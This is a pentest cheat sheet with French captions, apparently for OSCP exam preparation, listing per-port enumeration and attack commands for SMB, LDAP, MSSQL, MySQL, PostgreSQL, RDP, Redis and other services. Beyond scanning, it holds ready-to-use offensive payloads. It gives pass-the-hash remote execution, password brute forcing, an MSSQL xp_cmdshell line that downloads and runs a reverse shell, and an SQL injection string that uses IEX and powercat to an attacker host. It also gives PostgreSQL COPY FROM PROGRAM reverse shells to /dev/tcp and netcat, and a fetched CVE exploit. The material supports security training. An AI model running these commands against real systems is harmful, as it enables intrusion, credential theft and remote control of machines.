<p class="oscp-command-note">Lister les partages SMB et leurs permissions.</p>

```bash
smbmap -H <IP>
smbmap -u '' -p '' -H <IP>
smbmap -u 'guest' -p '' -H <IP>
smbmap -u '' -p '' -H <IP> -R
```


<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>

```bash
crackmapexec smb <IP>
crackmapexec smb <IP> -u '' -p ''
crackmapexec smb <IP> -u 'guest' -p ''
crackmapexec smb <IP> -u '' -p '' --shares
crackmapexec smb <IP> -u guest -p "" --rid-brute
crackmapexec smb <IP> -u '[user]' -p '[password]'
```


<p class="oscp-command-note">Examiner les informations SMB et du domaine.</p>

```bash
# Basic information gathering on the domain
enum4linux -a <IP>
enum4linux -a -u "" -p "" <IP> && enum4linux -a -u "guest" -p "" <IP>

# Extract domain users
enum4linux -U <DOMAIN_IP>

# Extract available domain shares
enum4linux -S <IP>

enum4linux -a -M -l -d <ip> 2>&1
enum4linux -a -u "" -p "" <ip>
enum4linux -a -u "guest" -p "" <ip>
enum4linux -a -u "[user]" -p "[password]" <ip>
```


```bash
smbclient --no-pass -L //<ip>
smbclient -L //<ip> -U [user]
smbclient //<IP>/<SHARE>
smbclient -N //<IP>/<SHARE>
smbclient //<IP>/<SHARE> -U <USER> -c "prompt OFF;recurse ON;mget *" # Change the timeout to download big files

# Change the timeout to download big files
help timeout
timeout 100

# Other commands
prompt off
recurse on
mget *
```


<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>

```bash
crackmapexec smb <IP> -u <USERS_LIST> -p <PASSWORDS_LIST>
hydra -V -f -L <USERS_LIST> -P <PASSWORDS_LIST> smb://<IP> -u -vV
```


<p class="oscp-command-note">Créer un répertoire.</p>

```bash
# Mounts SMB shares to a local directory for further access and manipulation.
mkdir /tmp/share
sudo mount -t cifs //<IP>/<SHARE> /tmp/share
sudo mount -t cifs -o 'username=<USER>,password=<PASSWORD>' //<IP>/<SHARE> /tmp/share
```


<p class="oscp-command-note">Exécuter une commande distante via SMB.</p>

```bash
# PsExec
psexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
psexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

# WMIexec
wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
wmiexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

# SMBexec
smbexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
smbexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

# AteExec
atexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP> <COMMAND>
atexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>
```


```bash
# Credentials
psexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>

# Pass the Hash
psexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

# Testing with Crackmapexec
crackmapexec smb <IP> -u <USER> -p <PASSWORD> --psexec
crackmapexec smb <IP> -u <USER> -H <NTHASH> --psexec
```


<p class="oscp-command-note">Exécuter une commande distante via WMI.</p>

```bash
# Credentials
wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>

# Pass the Hash
wmiexec.py <DOMAIN>/<USER>@<IP> -hashes :<NTHASH>

# Testing with Crackmapexec
crackmapexec wmiexec <IP> -u <USER> -p <PASSWORD>
crackmapexec wmiexec <IP> -u <USER> -H <NTHASH>
```


### 143, 993: IMAP


<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>

```bash
nmap -p 143,993 --script imap-ntlm-info <ip>
```


<p class="oscp-command-note">Examiner une connexion TLS ou un certificat.</p>

```bash
openssl s_client -connect <target-ip>:993
```


<p class="oscp-command-note">Rechercher des références de vulnérabilités connues.</p>

```bash
searchsploit imap <version>
```


<p class="oscp-command-note">Exécuter un script Python.</p>

```bash
# Usage
python3 check_imap.py <target-ip> <port>
```


<p class="oscp-command-note">Script Python lié à « 143, 993: IMAP ».</p>

```python
import imaplib
import sys

def check_imap_capabilities(host, port):
    if port == 993:
        mail = imaplib.IMAP4_SSL(host)
    else:
        mail = imaplib.IMAP4(host)
    
    print(mail.capabilities())

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 script.py <host> <port>")
        sys.exit(1)
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    
    check_imap_capabilities(host, port)
```


### 161 (UDP): SNMP


<p class="oscp-command-note">Scanner les ports et services avec Nmap.</p>

```bash
sudo nmap -sU --open -p 161 <target-ip-range> -oG open-snmp.txt

sudo nmap --script snmp-* -sU -p 161 <target-ip>

sudo nmap -sU -p 161 --script snmp-brute --script-args snmp-brute.communitiesdb=<community-file> <target-ip>
```


<p class="oscp-command-note">Interroger les paramètres SNMP.</p>

```bash
# Version: 1, 2c, 3
# Community String: public, private, security, etc
snmpwalk -v <SNMP_VERSION> -c <COMMUNITY_STRING> <target-ip> .1
```


<p class="oscp-command-note">Script shell dans la rubrique « 161 (UDP): SNMP ».</p>

```bash
# Popular wordlist: /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt

# Onesixtyone
onesixtyone -c <community-file> <target-ip>

# Snmpwalk
snmpwalk -c <COMMUNITY_STRING> -v <SNMP_VERSION> <target-ip>

# Snmpbulkwalk
snmpbulkwalk -c <COMMUNITY_STRING> -v <SNMP_VERSION> <target-ip>

# Snmp-check
snmp-check <target-ip>
```


**Paramètres et repères :**
`onesixtyone`  


<p class="oscp-command-note">Afficher ou écrire une valeur.</p>

```bash
echo <community1> > community
echo <community2> >> community
echo <community3> >> community

for ip in $(seq 1 254); do echo <target-network>.<ip>; done > ips

onesixtyone -c community -i ips
```


<p class="oscp-command-note">Interroger les paramètres SNMP.</p>

```bash
snmpwalk -v <SNMP_VERSION> -c <COMMUNITY_STRING> <target-ip> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
```


```bash
snmpwalk -c <COMMUNITY_STRING> -v <SNMP_VERSION> <target-ip> <OID>
```




```text
1.3.6.1.2.1.25.1.6.0 --> System Processes
1.3.6.1.4.1.77.1.2.25 --> User Accounts
1.3.6.1.2.1.6.13.1.3 --> TCP Local Ports
1.3.6.1.2.1.25.4.2.1.2 --> Running Programs
1.3.6.1.2.1.25.4.2.1.4 --> Processes Path
1.3.6.1.2.1.25.2.3.1.4 --> Storage Units
1.3.6.1.2.1.25.6.3.1.2 --> Softyware Name
```


### 389, 636, 3268 & 3269: LDAP

Examiner les objets, les droits et les services du domaine.


<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>

```bash
nmap -n -sV --script "ldap* and not brute" <target_ip>
```


<p class="oscp-command-note">Interroger les objets de l&#x27;annuaire LDAP.</p>

```bash
# Basic LDAP query
ldapsearch -x -H ldap://<target_ip>

# Basic LDAP Search for a base-level
ldapsearch -h <target_ip> -x -s base

# Afficher les contextes de nommage LDAP
ldapsearch -x -H ldap://<target_ip> -s base namingcontexts

# Search in a Specific Base Domain Name
ldapsearch -x -H ldap://<target_ip> -b "DC=<domain>,DC=<tld>"

# Enumerate users using LDAP
ldapsearch -v -x -b "DC=<domain>,DC=<tld>" -H "ldap://<target_ip>" "(objectclass=*)"

# Retrieve users Account Name
ldapsearch -v -x -b "DC=<domain>,DC=<tld>" -H "ldap://<target_ip>" "(objectclass*)" | grep sAMAccountName:

# Search with Filters
ldapsearch -x -H ldap://<target_ip> -b "DC=<domain>,DC=<tld>" "(objectclass=user)"
ldapsearch -x -H ldap://<target_ip> -b "DC=<domain>,DC=<tld>" "(objectclass=group)"

# Searching with authentication
ldapsearch -h <target_ip> -x -D '<domain>\<user>' -w '<password>' -b "DC=<domain>,DC=<tld>"

# Searching terms
ldapsearch -H ldap://<target_ip> -x -D '<domain>\<user>' -w '<password>' -b "DC=<domain>,DC=<tld>" "<term>"

# Specifies the value term to return
ldapsearch -H ldap://<target_ip> -x -D '<domain>\<user>' -w '<password>' -b "DC=<domain>,DC=<tld>" "<term>" <additionalTerm>
```


<p class="oscp-command-note">Examiner les comptes Kerberos du domaine.</p>

```bash
kerbrute userenum -d <domain> --dc <dc_ip> <userlist>
```


<p class="oscp-command-note">Script shell dans la rubrique « 389, 636, 3268 &amp; 3269: LDAP ».</p>

```bash
# Search Terms to Find Cleartext Passwords
# Search for ms-MCS-AdmPwd (local administrator passwords)
(ms-MCS-AdmPwd=*)

# Search for attributes containing 'password' in description
(description=*password*)

# Search for LAPS expiration time (to identify potential password management)
(ms-MCS-AdmPwdExpirationTime=*)

# Search for common weak passwords in attributes like description
(description=*(123456*|password*|qwerty*|letmein*))

# General LDAP Search Filters
# Search for All Users
(objectClass=user)

# Search for All Computers
(objectClass=computer)

# Search for All Groups
(objectClass=group)

# Search for Disabled Accounts
(userAccountControl:1.2.840.113556.1.4.803:=2)

# Search for Expired Accounts
(& (objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2)(!(pwdLastSet=0)))

# Search for Specific Group Membership
(&(objectClass=user)(memberOf=CN=GroupName,OU=Groups,DC=domain,DC=com))

# Search for Users with Specific Attributes
# For users with a specific email domain
(mail=*@example.com)
# For users with a specific title
(title=Manager)

# Specific Attributes

# Search for Password Last Set
(pwdLastSet=*)

# Search for Accounts with Expired Passwords
(& (objectClass=user)(pwdLastSet<=0))

# Search for Accounts in a Specific Organizational Unit (OU)
(distinguishedName=*,OU=Sales,DC=domain,DC=com)

# Security-Related Searches

# Search for Accounts with Kerberos Pre-Authentication Disabled
(userAccountControl:1.2.840.113556.1.4.803:=4194304)

# Search for Service Principal Names (SPNs)
(servicePrincipalName=*)

# Search for Delegated Users
(msDS-AllowedToDelegateTo=*)

# Search for Accounts with Privileges
(memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=com)

# Other Useful Searches

# Search for All Organizational Units
(objectClass=organizationalUnit)

# Search for Active Directory Certificate Services
(objectClass=cACertificate)

# Search for All Attributes of a Specific User
(sAMAccountName=username)

# Search for Accounts with Specific Notes or Descriptions
(description=*keyword*)

# Search for all objects in the directory
(objectClass=*)

# Search for service accounts
(objectCategory=serviceAccount)

# Search for accounts with specific group memberships (replace 'GroupName')
(memberOf=CN=GroupName,OU=Groups,DC=domain,DC=com)

# Search for computer accounts
(objectClass=computer)

# Search for users in a specific organizational unit (replace 'OU=Users')
(ou=OU=Users,DC=domain,DC=com)

# Search for all accounts with specific attributes
(pwdLastSet=0)
```


### 1433: MSSQL

Examiner les connexions, la configuration et les requêtes de la base de données.


<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>

```bash
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <ip>

# Enumerate MSSQL database information and configurations
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=<username>,mssql.password=<password>,mssql.instance-name=<instance_name> -sV -p 1433 <target_ip>
```


<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>

```bash
# Check MSSQL service and execute command
crackmapexec mssql -d <domain> -u <username> -p <password> -x "whoami" <target_ip>

# Query databases and list them
crackmapexec mssql -d <domain> -u <username> -p <password> -x "SELECT name FROM master.dbo.sysdatabases;" <target_ip>
```


<p class="oscp-command-note">Script shell dans la rubrique « 1433: MSSQL ».</p>

```bash
# Connect to MSSQL using sqsh (Linux)
sqsh -S <target_ip> -U <username> -P <password>

# Connect to MSSQL using sqsh (Windows)
sqsh -S <target_ip> -U <domain>\\<username> -P <password> -D <database>
```


<p class="oscp-command-note">Instruction SQL dans la rubrique « 1433: MSSQL ».</p>

```sql
-- Enable advanced options and xp_cmdshell for command execution
EXEC SP_CONFIGURE 'show advanced options', 1;
RECONFIGURE;
GO

EXEC SP_CONFIGURE 'xp_cmdshell', 1;
RECONFIGURE;
GO

-- Test xp_cmdshell to execute system commands
EXEC xp_cmdshell 'whoami';
GO

-- Download and execute a reverse shell
EXEC xp_cmdshell 'powershell "Invoke-WebRequest -Uri http://<attacker_ip>:<port>/reverse.exe -OutFile c:\\Users\\Public\\reverse.exe"';
GO

EXEC xp_cmdshell 'c:\\Users\\Public\\reverse.exe';
GO
```


```sql
-- SQL Injection example to execute system commands
test'; EXEC master.dbo.xp_cmdshell 'powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString(''http://<attacker_ip>:<port>/powercat.ps1'');powercat -c <attacker_ip> -p <port> -e powershell"';--
```


```sql
-- List all the databases
SELECT name FROM master.dbo.sysdatabases
                
-- List all tables in the current database
SELECT * FROM information_schema.tables;

-- View contents of a specific table
SELECT * FROM <table_name>;

-- Search for specific data in a table
SELECT * FROM <table_name> WHERE <column_name> LIKE '%<search_term>%';

-- Insert a new record into a table
INSERT INTO <table_name> (<column1>, <column2>) VALUES ('<value1>', '<value2>');

-- Update an existing record in a table
UPDATE <table_name> SET <column_name> = '<new_value>' WHERE <condition>;

-- Delete a record from a table
DELETE FROM <table_name> WHERE <condition>;
```


### 2049: NFS


<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>

```bash
nmap -p 2049 -sV --script "nfs-showmount,nfs-ls,nfs-statfs,nfs-secure,nfs-client,disk,nfs-*" <target_ip>
```


<p class="oscp-command-note">Lister les exports NFS.</p>

```bash
# Show all NFS shares on the target
showmount -e <target_ip>

# Show mount information for the target
showmount <target_ip>
```


<p class="oscp-command-note">Créer un répertoire.</p>

```bash
# Create a local directory to mount the NFS share
mkdir <mount_point>

# Mount the NFS share
sudo mount -t nfs -o vers=<version>,nolock <target_ip>:<share> <mount_point>
```


### 3003: CGMS (possible)


<p class="oscp-command-note">Établir ou tester une connexion avec Netcat.</p>

```bash
# Connect to the service
nc -nv <target_ip> 3003

# Get a list of available commands
help

# Check the version of the CGMS service
version
```


<p class="oscp-command-note">Télécharger une ressource distante.</p>

```bash
# Download the exploit script
wget https://raw.githubusercontent.com/b4ny4n/CVE-2020-13151/master/cve2020-13151.py

# Run the exploit with appropriate parameters
python3 cve2020-13151.py --ahost=<target_ip> --aport=3000 --pythonshell --lhost=<local_ip> --lport=443

# Start a Netcat listener on your local machine
nc -nlvp 443
```


<p class="oscp-command-note">Script PowerShell dans la rubrique « 3003: CGMS (possible) ».</p>

```powershell
bins
build
build_os
build_time
cluster-name
config-get
config-set
digests
dump-cluster
dump-fabric
dump-hb
dump-hlc
dump-migrates
dump-msgs
dump-rw
dump-si
dump-skew
dump-wb-summary
eviction-reset
feature-key
get-config
get-sl
health-outliers
health-stats
histogram
jem-stats
jobs
latencies
log
log-set
log-message
logs
mcast
mesh
name
namespace
namespaces
node
physical-devices
quiesce
quiesce-undo
racks
recluster
revive
roster
roster-set
service
services
services-alumni
services-alumni-reset
set-config
set-log
sets
show-devices
sindex
sindex-create
sindex-delete
sindex-histogram
statistics
status
tip
tip-clear
truncate
truncate-namespace
truncate-namespace-undo
truncate-undo
version
```


### 3306: MYSQL

Examiner les connexions, la configuration et les requêtes de la base de données.


<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>

```bash
nmap -sV -p 3306 --script "mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122" <target_ip>
```


<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>

```bash
crackmapexec mysql -d <database> -u <username> -p <password> -x "SHOW DATABASES;" <target_ip>
```


<p class="oscp-command-note">Vérifier des identifiants sur un service autorisé.</p>

```bash
# Brute force MySQL login using Hydra
hydra -l <username> -P <password_list> -s 3306 -vV <IP> mysql
```


<p class="oscp-command-note">Interroger une base de données MySQL.</p>

```bash
mysql -h <target_ip> -u <username> -p <database>
```


<p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>

```sql
SHOW DATABASES;

USE <database_name>;

SHOW TABLES;

DESCRIBE <table_name>;

SELECT * FROM <table_name>;
```




```sql
# Database User Enumeration
SELECT user FROM mysql.user;

# Privilege Escalation
GRANT ALL PRIVILEGES ON *.* TO '<username>'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;
```


```powershell
# 1. Copy an already existing file from Windows to another location.
SELECT LOAD_FILE('C:\\xampp\htdocs\\ncat.exe') INTO DUMPFILE 'C:\\xampp\\htdocs\\nc.exe';

# 2. Check the permissions of the new written file.
icacls 'C:\\xampp\htdocs\nc.exe'

# An output like the one below indicates that the file was written with admin privileges, therefore the DB user has admin privilege (consider WerTrigger exploit for excalation).
nc.exe WinServer\\apache:(I)(F)  
    NT AUTHORITY\\SYSTEM:(I)(F)  
    BUILTIN\\Administrators:(I)(F)  
    BUILTIN\\Users:(I)(RX)  
Successfully processed 1 files; Failed processing 0 files
```


### 3389: RDP


<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>

```bash
nmap --script "rdp-enum-encryption,rdp-vuln-ms12-020,rdp-ntlm-info,rdp-banner" -p 3389 <IP>
```


<p class="oscp-command-note">Vérifier des identifiants sur un service autorisé.</p>

```bash
hydra -L <user_list> -P <password_list> -s 3389 rdp://<IP>
```


<p class="oscp-command-note">Script shell dans la rubrique « 3389: RDP ».</p>

```bash
# Using Crowbar
crowbar -b rdp -s <target_ip>/32 -U users.txt -C rockyou.txt

# Using CrackMapExec
crackmapexec rdp <target_ip> -u users.txt -p rockyou.txt
```


<p class="oscp-command-note">Ouvrir une session RDP.</p>

```bash
# Connect using xfreerdp with various options
xfreerdp /cert-ignore /bpp:8 /compression /themes /wallpaper /auto-reconnect /h:1000 /w:1600 /v:<IP> /u:<username> /p:<password>

# Connect with a drive mapping and increased timeout
xfreerdp /u:<username> /v:<IP> /cert:ignore /p:<password> /timeout:20000 /drive:<drive_name>,<local_path>

# Connect with clipboard support and set resolution
xfreerdp /compression +auto-reconnect /u:$USER/p:$PASSWORD /v:<ip> +clipboard /size:1920x1080 /drive:desktop,/home/$YOUR_USERNAME/Desktop

# Connect using rdesktop with credentials
rdesktop -u $USER -p $PASSWORD -g 1920x1080 <ip>

# Connect using rdesktop without credentials
rdesktop <ip>
```


### 5432, 5433: PostgreSQL

Examiner les connexions, la configuration et les requêtes de la base de données.


<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>

```bash
nmap -sV -p 5432,5433 --script "postgresql-info,postgresql-user-enum,postgresql-ssl" <ip>
```


<p class="oscp-command-note">Vérifier des identifiants sur un service autorisé.</p>

```bash
hydra -L users.txt -P passwords.txt -s 5432 <ip> postgresql
```


<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>

```bash
crackmapexec postgres -d <DB_NAME> -u <USER> -p <PASSWORD> -t <ip>
```




```bash
# -W: Prompt for password
psql -h <ip> -p 5432 -U <USER> -W
```


<p class="oscp-command-note">Exécuter un script Python.</p>

```bash
# RCE is possible for versions: PostgreSQL DB 11.3 - 11.9

# Run the exploit script to gain remote code execution
python3 50847.py -i <ip> -p 5437 -c "busybox nc $ATTACKER_IP 80 -e sh"
```


<p class="oscp-command-note">Script shell dans la rubrique « 5432, 5433: PostgreSQL ».</p>

```bash
#POC  
DROP TABLE IF EXISTS cmd_exec;  
CREATE TABLE cmd_exec(cmd_output text);  
COPY cmd_exec FROM PROGRAM 'id';  
SELECT * FROM cmd_exec;  
DROP TABLE IF EXISTS cmd_exec;

#Reverse Shell
DROP TABLE IF EXISTS cmd_exec;  
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'sh -i >& /dev/tcp/$KaliIP/8080 0>&1';
SELECT * FROM cmd_exec;  
DROP TABLE IF EXISTS cmd_exec;
```


<p class="oscp-command-note">Lire les résultats d&#x27;une requête SQL.</p>

```sql
# List all databases
\l

# Switch to a specific database
\c <DB_NAME>

# List all tables in the current database
\dt

# View the schema of a specific table
\d <TABLE_NAME>

# Query the contents of a specific table
SELECT * FROM <TABLE_NAME>;

# Get detailed information about a table, including columns and their types
\d+ <TABLE_NAME>

# Execute a query to find specific data, such as users with a particular attribute
SELECT * FROM users WHERE attribute = 'value';

# Example command to list all tables and their columns
SELECT table_name, column_name, data_type
FROM information_schema.columns
WHERE table_schema = 'public';

# Execute an SQL command to create a new table
CREATE TABLE test_table (
    id SERIAL PRIMARY KEY,
    name VARCHAR(100),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

# Insert data into a table
INSERT INTO test_table (name) VALUES ('example_data');

# Update data in a table
UPDATE test_table SET name = 'updated_data' WHERE id = 1;

# Delete data from a table
DELETE FROM test_table WHERE id = 1;
```


### 5900: VNC (Virtual Network Computing)


<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>

```bash
nmap -p 5900 --script vnc-info,vnc-auth-bypass <ip>
```


<p class="oscp-command-note">Script shell dans la rubrique « 5900: VNC (Virtual Network Computing) ».</p>

```bash
# Use vncviewer or tigervnc to connect to a VNC server
vncviewer <ip>:5900

# More detailed connection with authentication
vncviewer -passwd /path/to/passwordfile <ip>:5900
```


<p class="oscp-command-note">Vérifier des identifiants sur un service autorisé.</p>

```bash
hydra -L <user_list> -P <password_list> vnc://<ip>
```




```text
No Password
vnc
1234
```




```text
1. Explore the filesystem
2. Run commands
3. Capture screenshots with scrot
4. Manipulate files
```


### 5985, 5986: WinRM

Observer les permissions et la configuration de Windows.


<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>

```bash
nmap -p 5985,5986 --script winrm-info <ip>
```


<p class="oscp-command-note">Examiner un service Windows avec CrackMapExec.</p>

```bash
crackmapexec winrm <IP> -u <USER> -p <PASSWORD>
```




```powershell
# Using PowerShell to connect to WinRM
Enter-PSSession -ComputerName <ip> -Credential (Get-Credential)
```


<p class="oscp-command-note">Ouvrir une session distante WinRM.</p>

```bash
# using Kali to connect to WinRM
evil-winrm -i <ip> -u <USER> -p <PASSWORD>
```


### 6379: Redis


<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>

```bash
nmap -p 6379 --script "redis-info,redis-rce" <ip>
```


<p class="oscp-command-note">Interroger un serveur Redis.</p>

```bash
redis-cli -h <ip> -p 6379 -a <password_to_try>
```


<p class="oscp-command-note">Rechercher des références de vulnérabilités connues.</p>

```bash
# Search for known Redis vulnerabilities and exploitation techniques
searchsploit redis

# Run a Redis rogue server to capture data or execute commands
python3 redis-rogue-server.py -p 6379

# Run Redis RCE exploit using a custom script (replace 'payload' with the desired payload)
python3 redis-rce-exploit.py -h <ip> -p 6379 -c "payload"
```


<p class="oscp-command-note">Interroger un serveur Redis.</p>

```bash
# Connect to Redis server
redis-cli -h <ip> -p 6379

# After connecting, list databases and their keys
info
keys *
select <db_number> # select database number (0 by default)

# Example of running commands
set mykey myvalue
get mykey

config get *  # View all configuration options
shutdown      # Shutdown the Redis server
```


### Unkown Port

Vérifier les ports et les services de la cible autorisée.


<p class="oscp-command-note">Établir ou tester une connexion avec Netcat.</p>

```bash
# Connect to the unknown port to identify the service
nc -nv <IP> <PORT>
```




```bash
# Always list available commands or options to gather more information about the service
help
```


<p class="oscp-command-note">Afficher ou écrire une valeur.</p>

```bash
# Attempt to login with known or guessed credentials
# You may need to replace <USERNAME> and <PASSWORD> with appropriate values
echo -e "<USERNAME>\n<PASSWORD>" | nc -nv <IP> <PORT>

# If the service provides command options or help output, use these to guide further actions
# For example, if the service has commands like 'list', 'status', or 'config', use those
echo "list" | nc -nv <IP> <PORT>
```


<p class="oscp-command-note">Script shell dans la rubrique « Unkown Port ».</p>

```bash
# After identifying the service, refer to its documentation or default command set
# For example, if the service is a management tool, commands might include listing users or querying configurations

# Example commands might include:
# - Listing users or available configurations
# - Executing administrative commands if applicable
# - Gathering information about the service status or configuration

# Replace with appropriate commands based on the identified service and help output
```

---

Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).


## Syntaxes complémentaires de la source

Exemples présents hors des rubriques principales de la page d'origine.


**Paramètres et repères :**
`-m`  


<!-- refined-oscp -->
